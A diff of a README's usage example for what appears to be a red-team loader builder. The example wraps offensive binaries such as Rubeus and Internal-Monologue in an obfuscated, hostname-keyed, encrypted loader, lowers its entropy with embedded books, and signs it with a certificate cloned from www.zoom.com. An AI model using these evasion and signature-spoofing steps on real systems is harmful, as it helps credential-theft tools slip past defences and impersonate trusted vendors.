@@ -32,16 +32,16 @@ sudo bash install.sh
 ## Usage
 
 ```
-python build.py --file "..\Rubeus.exe" --hostname JOE-WIN10-VM --domain www.zoom.com
+python build.py --file /tmp/Internal-Monologue.exe --hostname PFC-SYSCTR --domain www.zoom.com
 
 [+] Obfuscated loader source files
-[+] Keyed on hostname JOE-WIN10-VM
-[+] Encrypted and embedded ..\Rubeus.exe as a resource file
+[+] Keyed on hostname PFC-SYSCTR
+[+] Encrypted and embedded /tmp/Internal-Monologue.exe as a resource file
 [+] Randomized loader filename
-[+] Embedded 5 books as resource files
+[+] Embedded 1 books as resource files
 [+] Entropy of loader: 5.35
 [+] Digitally signed loader with certificate cloned from www.zoom.com
-[+] Loader compiled to C:\Users\Joe\source\repos\temp\iVZuUrrL.exe
+[+] Loader compiled to /tmp/PositiveIntent-main/temp/pwCXupfi.exe
 ```
 
 ## Detection Status
